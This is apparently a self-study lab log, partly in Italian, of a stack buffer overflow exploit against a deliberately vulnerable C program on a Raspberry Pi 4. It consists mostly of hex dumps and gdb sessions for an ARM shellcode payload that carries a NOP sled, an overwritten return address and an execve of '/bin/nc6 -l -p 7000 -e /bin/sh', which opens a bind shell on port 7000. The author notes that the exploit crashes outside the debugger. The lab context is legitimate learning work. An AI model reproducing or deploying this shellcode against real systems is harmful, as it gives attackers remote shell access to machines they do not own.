./target < exploitarm_rpi4_nc6 da "Istruzione non consentita", nonostante il payload sia sempre completamente caricato (e sempre lo stesso): da indagare...
Di seguito una prova con gdb in cui alla fine nc6 è stato caricato e funzionante
----------------------------------

pi@raspberrypi:~/Desktop/cs $ ./target < exploitarm_rpi4_nc6
befff444
input BEFFF444>
1173 bytes read
0xbefff444: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xbefff454: 95 04 00 00 50 F5 FF FF 18 00 00 00 50 F5 FF BE ¦...P¦¦¦....P¦¦¦
0xbefff464: 50 F5 FF BE 50 F5 FF BE 50 F5 FF BE 50 F5 FF BE P¦¦¦P¦¦¦P¦¦¦P¦¦¦
0xbefff474: 50 F5 FF BE 50 F5 FF BE 50 F5 FF BE 50 F5 FF BE P¦¦¦P¦¦¦P¦¦¦P¦¦¦
0xbefff484: 70 70 30 00 70 70 31 00 70 70 32 00 70 70 33 00 pp0.pp1.pp2.pp3.
0xbefff494: 70 70 34 00 70 70 35 00 00 00 00 00 65 6E 76 3E pp4.pp5.....env>
0xbefff4a4: 00 00 00 00 61 72 67 3E 2F 62 69 6E 2F 6E 63 36 ....arg>/bin/nc6
0xbefff4b4: 00 2D 6C 00 2D 70 00 37 30 30 30 00 2D 65 00 2F .-l.-p.7000.-e./
0xbefff4c4: 62 69 6E 2F 73 68 00 6E 6F 70 3E 00 00 00 00 00 bin/sh.nop>.....
0xbefff4d4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4e4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4f4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff504: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff514: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff524: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff534: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff544: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff554: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff564: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff574: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff584: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff594: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff5a4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff5b4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff5c4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff5d4: 0E 00 00 EA 90 FE FF FF 99 FE FF FF 9C FE FF FF ...¦¦¦¦¦¦¦¦¦¦¦¦
0xbefff5e4: 9F FE FF FF A4 FE FF FF A7 FE FF FF AE FE FF FF ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
0xbefff5f4: 68 FE FF FF 6C FE FF FF 70 FE FF FF 74 FE FF FF h¦¦¦l¦¦¦p¦¦¦t¦¦¦
0xbefff604: 78 FE FF FF 7C FE FF FF 88 FE FF FF 94 00 00 00 x¦¦¦|¦¦¦¦¦¦¦¦...
0xbefff614: 0F 40 A0 E1 00 00 A0 E1 00 00 A0 E1 18 70 1F E5 .@¦¦..¦¦..¦¦.p.¦
0xbefff624: 07 70 84 E0 B0 30 D7 E1 02 3A 83 E2 B0 30 C7 E1 .p¦¦0¦¦.:¦¦0¦¦
0xbefff634: 64 70 1F E5 07 70 84 E0 50 00 1F E5 00 00 84 E0 dp.¦.p¦¦P..¦..¦¦
0xbefff644: 00 70 80 E5 74 70 1F E5 07 70 84 E0 60 00 1F E5 .p¦¦tp.¦.p¦¦`..¦
0xbefff654: 00 00 84 E0 00 70 80 E5 84 70 1F E5 07 70 84 E0 ..¦¦.p¦¦p.¦.p¦¦
0xbefff664: 70 00 1F E5 00 00 84 E0 00 70 80 E5 94 70 1F E5 p..¦..¦¦.p¦¦p.¦
0xbefff674: 07 70 84 E0 80 00 1F E5 00 00 84 E0 00 70 80 E5 .p¦¦..¦..¦¦.p¦¦
0xbefff684: A4 70 1F E5 07 70 84 E0 90 00 1F E5 00 00 84 E0 ¦p.¦.p¦¦..¦..¦¦
0xbefff694: 00 70 80 E5 B4 70 1F E5 07 70 84 E0 A0 00 1F E5 .p¦¦p.¦.p¦¦..¦
0xbefff6a4: 00 00 84 E0 00 70 80 E5 A8 00 1F E5 00 00 84 E0 ..¦¦.p¦¦..¦..¦¦
0xbefff6b4: E4 00 1F E5 00 00 84 E0 D0 10 1F E5 01 10 84 E0 ¦..¦..¦¦¦..¦..¦¦
0xbefff6c4: 6F 70 A0 E3 64 70 47 E2 04 40 24 E0 00 00 00 EF op¦¦dpG¦.@$¦...¦
0xbefff6d4: 3C 69 6E 74 00 00 00 00 FA F6 FF BE 00 00 00 00 <int....¦¦¦¦....
0xbefff6e4: 00 00 00 00 00 00 2D 56 AA D9 40 67 C0 E1 40 77 ......-V¦¦@g¦¦@w
0xbefff6f4: 36 36 41 E8 35 FB 76 37 6C 00 2E 2F 74 61 72 67 66A¦5¦v7l../targ
0xbefff704: 65 74 00 53 48 45 4C 4C 3D 2F 62 69 6E 2F 62 61 et.SHELL=/bin/ba
0xbefff714: 73 68 00 47 45 4E 49 43 41 4D 5F 43 41 43 48 45 sh.GENICAM_CACHE
0xbefff724: 5F 56 33 5F 30 3D 2F 76 61 72 2F 6F 70 74 2F 67 _V3_0=/var/opt/g
0xbefff734: 65 6E 69 63 61 6D 2F 78 6D 6C 2F 63 61 63 68 65 enicam/xml/cache
0xbefff744: 00 4C 41 4E 47 55 41 47 45 3D 69 74 5F 49 54 2E .LANGUAGE=it_IT.
0xbefff754: 55 54 46 2D 38 00 4E 4F 5F 41 54 5F 42 52 49 44 UTF-8.NO_AT_BRID
0xbefff764: 47 45 3D 31 00 50 57 44 3D 2F 68 6F 6D 65 2F 70 GE=1.PWD=/home/p
0xbefff774: 69 2F 44 65 73 6B 74 6F 70 2F 63 73 00 4C 4F 47 i/Desktop/cs.LOG
0xbefff784: 4E 41 4D 45 3D 70 69 00 58 44 47 5F 53 45 53 53 NAME=pi.XDG_SESS
0xbefff794: 49 4F 4E 5F 54 59 50 45 3D 74 74 79 00 48 4F 4D ION_TYPE=tty.HOM
0xbefff7a4: 45 3D 2F 68 6F 6D 65 2F 70 69 00 4C 41 4E 47 3D E=/home/pi.LANG=
0xbefff7b4: 69 74 5F 49 54 2E 55 54 46 2D 38 00 4C 53 5F 43 it_IT.UTF-8.LS_C
0xbefff7c4: 4F 4C 4F 52 53 3D 72 73 3D 30 3A 64 69 3D 30 31 OLORS=rs=0:di=01
0xbefff7d4: 3B 33 34 3A 6C 6E 3D 30 31 3B 33 36 3A 6D 68 3D ;34:ln=01;36:mh=
0xbefff7e4: 30 30 3A 70 69 3D 34 30 3B 33 33 3A 73 6F 3D 30 00:pi=40;33:so=0
0xbefff7f4: 31 3B 33 35 3A 64 6F 3D 30 31 3B 33 35 3A 62 64 1;35:do=01;35:bd
0xbefff804: 3D 34 30 3B 33 33 3B 30 31 3A 63 64 3D 34 30 3B =40;33;01:cd=40;
0xbefff814: 33 33 3B 30 31 3A 6F 72 3D 34 30 3B 33 31 3B 30 33;01:or=40;31;0
0xbefff824: 31 3A 6D 69 3D 30 30 3A 73 75 3D 33 37 3B 34 31 1:mi=00:su=37;41
0xbefff834: 3A 73 67 3D 33 30 3B 34 33 3A 63 61 3D 33 30 3B :sg=30;43:ca=30;
0xbefff844: 34 31 3A 74 77 3D 33 30 3B 34 32 3A 6F 77 3D 33 41:tw=30;42:ow=3
0xbefff854: 34 3B 34 32 3A 73 74 3D 33 37 3B 34 34 3A 65 78 4;42:st=37;44:ex
0xbefff864: 3D 30 31 3B 33 32 3A 2A 2E 74 61 72 3D 30 31 3B =01;32:*.tar=01;
0xbefff874: 33 31 3A 2A 2E 74 67 7A 3D 30 31 3B 33 31 3A 2A 31:*.tgz=01;31:*
0xbefff884: 2E 61 72 63 3D 30 31 3B 33 31 3A 2A 2E 61 72 6A .arc=01;31:*.arj
0xbefff894: 3D 30 31 3B 33 31 3A 2A 2E 74 61 7A 3D 30 31 3B =01;31:*.taz=01;
0xbefff8a4: 33 31 3A 2A 2E 6C 68 61 3D 30 31 3B 33 31 3A 2A 31:*.lha=01;31:*
0xbefff8b4: 2E 6C 7A 34 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 68 .lz4=01;31:*.lzh
0xbefff8c4: 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 6D 61 3D 30 31 =01;31:*.lzma=01
0xbefff8d4: 3B 33 31 3A 2A ;31:*
BBBBBBBBBBBBBBBB¦
Istruzione non consentita
pi@raspberrypi:~/Desktop/cs $ gdb target
GNU gdb (Raspbian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "arm-linux-gnueabihf".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from target...done.
(gdb) l 0
1       // how to compile with stack execution:
2       // https://security.stackexchange.com/questions/234469/how-can-i-exploit-a-buffer-overflow-on-a-raspberry-pi-4
3       // gcc -g -no-pie -Wl,-z,norelro -fno-stack-protector -z execstack target.c -o target
4
5       #include <stdio.h>
6
7       void f()
8       {
9         char buffer[16];
10        int i, l;
(gdb)
11        unsigned char cc[17];
12        printf("%x\n", (unsigned int)buffer);
13        printf("input %X> ", buffer);
14          /*svuota il buffer*/
15        fflush(stdout);
16        scanf("%s", buffer);
17
18        l = 1173; // should be length of exploit
19
20        printf("\n%d bytes read\n", l);
(gdb) b 18
Breakpoint 1 at 0x10570: file target.c, line 18.
(gdb) c
The program is not being run.
(gdb) r
Starting program: /home/pi/Desktop/cs/target
befff3f4
input BEFFF3F4> qwer

Breakpoint 1, f () at target.c:18
18        l = 1173; // should be length of exploit
(gdb) b 52
Breakpoint 2 at 0x106cc: file target.c, line 52.
(gdb) restore ./exploit binary 0xbefff3f4
Restoring binary file ./exploit into memory (0xbefff3f4 to 0xbefff689)
(gdb) c
Continuing.

1173 bytes read
0xbefff3f4: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0xbefff404: 95 04 00 00 00 F5 FF FF 18 00 00 00 00 F5 FF BE ¦....¦¦¦.....¦¦¦
0xbefff414: 00 F5 FF BE 00 F5 FF BE 00 F5 FF BE 00 F5 FF BE .¦¦¦.¦¦¦.¦¦¦.¦¦¦
0xbefff424: 00 F5 FF BE 00 F5 FF BE 00 F5 FF BE 00 F5 FF BE .¦¦¦.¦¦¦.¦¦¦.¦¦¦
0xbefff434: 70 70 30 00 70 70 31 00 70 70 32 00 70 70 33 00 pp0.pp1.pp2.pp3.
0xbefff444: 70 70 34 00 70 70 35 00 00 00 00 00 65 6E 76 3E pp4.pp5.....env>
0xbefff454: 00 00 00 00 61 72 67 3E 2F 62 69 6E 2F 6E 63 36 ....arg>/bin/nc6
0xbefff464: 00 2D 6C 00 2D 70 00 37 30 30 30 00 2D 65 00 2F .-l.-p.7000.-e./
0xbefff474: 62 69 6E 2F 73 68 00 6E 6F 70 3E 00 00 00 00 00 bin/sh.nop>.....
0xbefff484: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff494: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4a4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4b4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4c4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4d4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4e4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff4f4: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff504: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff514: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff524: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff534: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff544: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff554: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff564: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff574: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0xbefff584: 0E 00 00 EA 90 FE FF FF 99 FE FF FF 9C FE FF FF ...¦¦¦¦¦¦¦¦¦¦¦¦
0xbefff594: 9F FE FF FF A4 FE FF FF A7 FE FF FF AE FE FF FF ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
0xbefff5a4: 68 FE FF FF 6C FE FF FF 70 FE FF FF 74 FE FF FF h¦¦¦l¦¦¦p¦¦¦t¦¦¦
0xbefff5b4: 78 FE FF FF 7C FE FF FF 88 FE FF FF 94 00 00 00 x¦¦¦|¦¦¦¦¦¦¦¦...
0xbefff5c4: 0F 40 A0 E1 00 00 A0 E1 00 00 A0 E1 18 70 1F E5 .@¦¦..¦¦..¦¦.p.¦
0xbefff5d4: 07 70 84 E0 B0 30 D7 E1 02 3A 83 E2 B0 30 C7 E1 .p¦¦0¦¦.:¦¦0¦¦
0xbefff5e4: 64 70 1F E5 07 70 84 E0 50 00 1F E5 00 00 84 E0 dp.¦.p¦¦P..¦..¦¦
0xbefff5f4: 00 70 80 E5 74 70 1F E5 07 70 84 E0 60 00 1F E5 .p¦¦tp.¦.p¦¦`..¦
0xbefff604: 00 00 84 E0 00 70 80 E5 84 70 1F E5 07 70 84 E0 ..¦¦.p¦¦p.¦.p¦¦
0xbefff614: 70 00 1F E5 00 00 84 E0 00 70 80 E5 94 70 1F E5 p..¦..¦¦.p¦¦p.¦
0xbefff624: 07 70 84 E0 80 00 1F E5 00 00 84 E0 00 70 80 E5 .p¦¦..¦..¦¦.p¦¦
0xbefff634: A4 70 1F E5 07 70 84 E0 90 00 1F E5 00 00 84 E0 ¦p.¦.p¦¦..¦..¦¦
0xbefff644: 00 70 80 E5 B4 70 1F E5 07 70 84 E0 A0 00 1F E5 .p¦¦p.¦.p¦¦..¦
0xbefff654: 00 00 84 E0 00 70 80 E5 A8 00 1F E5 02 00 22 E0 ..¦¦.p¦¦..¦.."¦
0xbefff664: E4 00 1F E5 00 00 84 E0 D0 10 1F E5 01 10 84 E0 ¦..¦..¦¦¦..¦..¦¦
0xbefff674: 6F 70 A0 E3 64 70 47 E2 04 40 24 E0 00 00 00 EF op¦¦dpG¦.@$¦...¦
0xbefff684: 3C 69 6E 74 0A 00 00 00 E1 FF FF BE 0F 00 00 00 <int....¦¦¦¦....
0xbefff694: BD F6 FF BE 00 00 00 00 00 00 00 00 00 00 00 00 ¦¦¦¦............
0xbefff6a4: 00 00 00 00 00 00 00 00 00 E2 C1 0C CE CB 5C 45 .........¦¦.¦¦\E
0xbefff6b4: 2B 0E 21 95 A8 D8 FC 0F D9 76 37 6C 00 2F 68 6F +.!¦¦¦¦.¦v7l./ho
0xbefff6c4: 6D 65 2F 70 69 2F 44 65 73 6B 74 6F 70 2F 63 73 me/pi/Desktop/cs
0xbefff6d4: 2F 74 61 72 67 65 74 00 53 48 45 4C 4C 3D 2F 62 /target.SHELL=/b
0xbefff6e4: 69 6E 2F 62 61 73 68 00 47 45 4E 49 43 41 4D 5F in/bash.GENICAM_
0xbefff6f4: 43 41 43 48 45 5F 56 33 5F 30 3D 2F 76 61 72 2F CACHE_V3_0=/var/
0xbefff704: 6F 70 74 2F 67 65 6E 69 63 61 6D 2F 78 6D 6C 2F opt/genicam/xml/
0xbefff714: 63 61 63 68 65 00 4C 41 4E 47 55 41 47 45 3D 69 cache.LANGUAGE=i
0xbefff724: 74 5F 49 54 2E 55 54 46 2D 38 00 4E 4F 5F 41 54 t_IT.UTF-8.NO_AT
0xbefff734: 5F 42 52 49 44 47 45 3D 31 00 50 57 44 3D 2F 68 _BRIDGE=1.PWD=/h
0xbefff744: 6F 6D 65 2F 70 69 2F 44 65 73 6B 74 6F 70 2F 63 ome/pi/Desktop/c
0xbefff754: 73 00 4C 4F 47 4E 41 4D 45 3D 70 69 00 58 44 47 s.LOGNAME=pi.XDG
0xbefff764: 5F 53 45 53 53 49 4F 4E 5F 54 59 50 45 3D 74 74 _SESSION_TYPE=tt
0xbefff774: 79 00 5F 3D 2F 75 73 72 2F 62 69 6E 2F 67 64 62 y._=/usr/bin/gdb
0xbefff784: 00 4C 49 4E 45 53 3D 35 35 00 48 4F 4D 45 3D 2F .LINES=55.HOME=/
0xbefff794: 68 6F 6D 65 2F 70 69 00 4C 41 4E 47 3D 69 74 5F home/pi.LANG=it_
0xbefff7a4: 49 54 2E 55 54 46 2D 38 00 4C 53 5F 43 4F 4C 4F IT.UTF-8.LS_COLO
0xbefff7b4: 52 53 3D 72 73 3D 30 3A 64 69 3D 30 31 3B 33 34 RS=rs=0:di=01;34
0xbefff7c4: 3A 6C 6E 3D 30 31 3B 33 36 3A 6D 68 3D 30 30 3A :ln=01;36:mh=00:
0xbefff7d4: 70 69 3D 34 30 3B 33 33 3A 73 6F 3D 30 31 3B 33 pi=40;33:so=01;3
0xbefff7e4: 35 3A 64 6F 3D 30 31 3B 33 35 3A 62 64 3D 34 30 5:do=01;35:bd=40
0xbefff7f4: 3B 33 33 3B 30 31 3A 63 64 3D 34 30 3B 33 33 3B ;33;01:cd=40;33;
0xbefff804: 30 31 3A 6F 72 3D 34 30 3B 33 31 3B 30 31 3A 6D 01:or=40;31;01:m
0xbefff814: 69 3D 30 30 3A 73 75 3D 33 37 3B 34 31 3A 73 67 i=00:su=37;41:sg
0xbefff824: 3D 33 30 3B 34 33 3A 63 61 3D 33 30 3B 34 31 3A =30;43:ca=30;41:
0xbefff834: 74 77 3D 33 30 3B 34 32 3A 6F 77 3D 33 34 3B 34 tw=30;42:ow=34;4
0xbefff844: 32 3A 73 74 3D 33 37 3B 34 34 3A 65 78 3D 30 31 2:st=37;44:ex=01
0xbefff854: 3B 33 32 3A 2A 2E 74 61 72 3D 30 31 3B 33 31 3A ;32:*.tar=01;31:
0xbefff864: 2A 2E 74 67 7A 3D 30 31 3B 33 31 3A 2A 2E 61 72 *.tgz=01;31:*.ar
0xbefff874: 63 3D 30 31 3B 33 31 3A 2A 2E 61 72 6A 3D 30 31 c=01;31:*.arj=01
0xbefff884: 3B 33 31 3A 2A ;31:*
BBBBBBBBBBBBBBBB¦

Breakpoint 2, f () at target.c:52
52      }
(gdb) stepi
0x000106d0      52      }
(gdb)
0x000106d4      52      }
(gdb)
0xbefff500 in ?? ()
(gdb) x /32i 0xbefff584
   0xbefff584:  b       0xbefff5c4
   0xbefff588:                  ; <UNDEFINED> instruction: 0xfffffe90
   0xbefff58c:                  ; <UNDEFINED> instruction: 0xfffffe99
   0xbefff590:                  ; <UNDEFINED> instruction: 0xfffffe9c
   0xbefff594:                  ; <UNDEFINED> instruction: 0xfffffe9f
   0xbefff598:                  ; <UNDEFINED> instruction: 0xfffffea4
   0xbefff59c:                  ; <UNDEFINED> instruction: 0xfffffea7
   0xbefff5a0:                  ; <UNDEFINED> instruction: 0xfffffeae
   0xbefff5a4:                  ; <UNDEFINED> instruction: 0xfffffe68
   0xbefff5a8:                  ; <UNDEFINED> instruction: 0xfffffe6c
   0xbefff5ac:                  ; <UNDEFINED> instruction: 0xfffffe70
   0xbefff5b0:                  ; <UNDEFINED> instruction: 0xfffffe74
   0xbefff5b4:                  ; <UNDEFINED> instruction: 0xfffffe78
   0xbefff5b8:                  ; <UNDEFINED> instruction: 0xfffffe7c
   0xbefff5bc:                  ; <UNDEFINED> instruction: 0xfffffe88
   0xbefff5c0:  muleq   r0, r4, r0
   0xbefff5c4:  mov     r4, pc
   0xbefff5c8:  nop                     ; (mov r0, r0)
   0xbefff5cc:  nop                     ; (mov r0, r0)
   0xbefff5d0:  ldr     r7, [pc, #-24]  ; 0xbefff5c0
   0xbefff5d4:  add     r7, r4, r7
   0xbefff5d8:  ldrh    r3, [r7]
   0xbefff5dc:  add     r3, r3, #8192   ; 0x2000
   0xbefff5e0:  strh    r3, [r7]
   0xbefff5e4:  ldr     r7, [pc, #-100] ; 0xbefff588
   0xbefff5e8:  add     r7, r4, r7
   0xbefff5ec:  ldr     r0, [pc, #-80]  ; 0xbefff5a4
   0xbefff5f0:  add     r0, r4, r0
   0xbefff5f4:  str     r7, [r0]
   0xbefff5f8:  ldr     r7, [pc, #-116] ; 0xbefff58c
   0xbefff5fc:  add     r7, r4, r7
   0xbefff600:  ldr     r0, [pc, #-96]  ; 0xbefff5a8
(gdb)
   0xbefff604:  add     r0, r4, r0
   0xbefff608:  str     r7, [r0]
   0xbefff60c:  ldr     r7, [pc, #-132] ; 0xbefff590
   0xbefff610:  add     r7, r4, r7
   0xbefff614:  ldr     r0, [pc, #-112] ; 0xbefff5ac
   0xbefff618:  add     r0, r4, r0
   0xbefff61c:  str     r7, [r0]
   0xbefff620:  ldr     r7, [pc, #-148] ; 0xbefff594
   0xbefff624:  add     r7, r4, r7
   0xbefff628:  ldr     r0, [pc, #-128] ; 0xbefff5b0
   0xbefff62c:  add     r0, r4, r0
   0xbefff630:  str     r7, [r0]
   0xbefff634:  ldr     r7, [pc, #-164] ; 0xbefff598
   0xbefff638:  add     r7, r4, r7
   0xbefff63c:  ldr     r0, [pc, #-144] ; 0xbefff5b4
   0xbefff640:  add     r0, r4, r0
   0xbefff644:  str     r7, [r0]
   0xbefff648:  ldr     r7, [pc, #-180] ; 0xbefff59c
   0xbefff64c:  add     r7, r4, r7
   0xbefff650:  ldr     r0, [pc, #-160] ; 0xbefff5b8
   0xbefff654:  add     r0, r4, r0
   0xbefff658:  str     r7, [r0]
   0xbefff65c:  ldr     r0, [pc, #-168] ; 0xbefff5bc
   0xbefff660:  eor     r0, r2, r2
   0xbefff664:  ldr     r0, [pc, #-228] ; 0xbefff588
   0xbefff668:  add     r0, r4, r0
   0xbefff66c:  ldr     r1, [pc, #-208] ; 0xbefff5a4
   0xbefff670:  add     r1, r4, r1
   0xbefff674:  mov     r7, #111        ; 0x6f
   0xbefff678:  sub     r7, r7, #100    ; 0x64
   0xbefff67c:  eor     r4, r4, r4
   0xbefff680:  svc     0x00000000
(gdb) stepi
0xbefff504 in ?? ()
(gdb)
0xbefff508 in ?? ()
(gdb)
0xbefff50c in ?? ()
(gdb)
0xbefff510 in ?? ()
(gdb)
0xbefff514 in ?? ()
(gdb)
0xbefff518 in ?? ()
(gdb)
0xbefff51c in ?? ()
(gdb)
0xbefff520 in ?? ()
(gdb)
0xbefff524 in ?? ()
(gdb)
0xbefff528 in ?? ()
(gdb)
0xbefff52c in ?? ()
(gdb)
0xbefff530 in ?? ()
(gdb)
0xbefff534 in ?? ()
(gdb)
0xbefff538 in ?? ()
(gdb)
0xbefff53c in ?? ()
(gdb)
0xbefff540 in ?? ()
(gdb)
0xbefff544 in ?? ()
(gdb)
0xbefff548 in ?? ()
(gdb)
0xbefff54c in ?? ()
(gdb)
0xbefff550 in ?? ()
(gdb)
0xbefff554 in ?? ()
(gdb)
0xbefff558 in ?? ()
(gdb)
0xbefff55c in ?? ()
(gdb)
0xbefff560 in ?? ()
(gdb)
0xbefff564 in ?? ()
(gdb)
0xbefff568 in ?? ()
(gdb)
0xbefff56c in ?? ()
(gdb)
0xbefff570 in ?? ()
(gdb)
0xbefff574 in ?? ()
(gdb)
0xbefff578 in ?? ()
(gdb)
0xbefff57c in ?? ()
(gdb)
0xbefff580 in ?? ()
(gdb)
0xbefff584 in ?? ()
(gdb)
0xbefff5c4 in ?? ()
(gdb) x /32i $pc
=> 0xbefff5c4:  mov     r4, pc
   0xbefff5c8:  nop                     ; (mov r0, r0)
   0xbefff5cc:  nop                     ; (mov r0, r0)
   0xbefff5d0:  ldr     r7, [pc, #-24]  ; 0xbefff5c0
   0xbefff5d4:  add     r7, r4, r7
   0xbefff5d8:  ldrh    r3, [r7]
   0xbefff5dc:  add     r3, r3, #8192   ; 0x2000
   0xbefff5e0:  strh    r3, [r7]
   0xbefff5e4:  ldr     r7, [pc, #-100] ; 0xbefff588
   0xbefff5e8:  add     r7, r4, r7
   0xbefff5ec:  ldr     r0, [pc, #-80]  ; 0xbefff5a4
   0xbefff5f0:  add     r0, r4, r0
   0xbefff5f4:  str     r7, [r0]
   0xbefff5f8:  ldr     r7, [pc, #-116] ; 0xbefff58c
   0xbefff5fc:  add     r7, r4, r7
   0xbefff600:  ldr     r0, [pc, #-96]  ; 0xbefff5a8
   0xbefff604:  add     r0, r4, r0
   0xbefff608:  str     r7, [r0]
   0xbefff60c:  ldr     r7, [pc, #-132] ; 0xbefff590
   0xbefff610:  add     r7, r4, r7
   0xbefff614:  ldr     r0, [pc, #-112] ; 0xbefff5ac
   0xbefff618:  add     r0, r4, r0
   0xbefff61c:  str     r7, [r0]
   0xbefff620:  ldr     r7, [pc, #-148] ; 0xbefff594
   0xbefff624:  add     r7, r4, r7
   0xbefff628:  ldr     r0, [pc, #-128] ; 0xbefff5b0
   0xbefff62c:  add     r0, r4, r0
   0xbefff630:  str     r7, [r0]
   0xbefff634:  ldr     r7, [pc, #-164] ; 0xbefff598
   0xbefff638:  add     r7, r4, r7
   0xbefff63c:  ldr     r0, [pc, #-144] ; 0xbefff5b4
   0xbefff640:  add     r0, r4, r0
(gdb) stepi
0xbefff5c8 in ?? ()
(gdb)
0xbefff5cc in ?? ()
(gdb)
0xbefff5d0 in ?? ()
(gdb)
0xbefff5d4 in ?? ()
(gdb)
0xbefff5d8 in ?? ()
(gdb)
0xbefff5dc in ?? ()
(gdb) info registers
r0             0xa                 10
r1             0x0                 0
r2             0x1                 1
r3             0x2                 2
r4             0xbefff5cc          3204445644
r5             0x10720             67360
r6             0x10434             66612
r7             0xbefff660          3204445792
r8             0x0                 0
r9             0x0                 0
r10            0xb6fff000          3070226432
r11            0xbefff500          3204445440
r12            0xa                 10
sp             0xbefff418          0xbefff418
lr             0xb6eb87b4          -1226078284
pc             0xbefff5dc          0xbefff5dc
cpsr           0x60000010          1610612752
fpscr          0x0                 0
(gdb) x /32x $pc
0xbefff5dc:     0xe2833a02      0xe1c730b0      0xe51f7064      0xe0847007
0xbefff5ec:     0xe51f0050      0xe0840000      0xe5807000      0xe51f7074
0xbefff5fc:     0xe0847007      0xe51f0060      0xe0840000      0xe5807000
0xbefff60c:     0xe51f7084      0xe0847007      0xe51f0070      0xe0840000
0xbefff61c:     0xe5807000      0xe51f7094      0xe0847007      0xe51f0080
0xbefff62c:     0xe0840000      0xe5807000      0xe51f70a4      0xe0847007
0xbefff63c:     0xe51f0090      0xe0840000      0xe5807000      0xe51f70b4
0xbefff64c:     0xe0847007      0xe51f00a0      0xe0840000      0xe5807000
(gdb)
0xbefff65c:     0xe51f00a8      0xe0220002      0xe51f00e4      0xe0840000
0xbefff66c:     0xe51f10d0      0xe0841001      0xe3a0706f      0xe2477064
0xbefff67c:     0xe0244004      0xef000000      0x746e693c      0x0000000a
0xbefff68c:     0xbeffffe1      0x0000000f      0xbefff6bd      0x00000000
0xbefff69c:     0x00000000      0x00000000      0x00000000      0x00000000
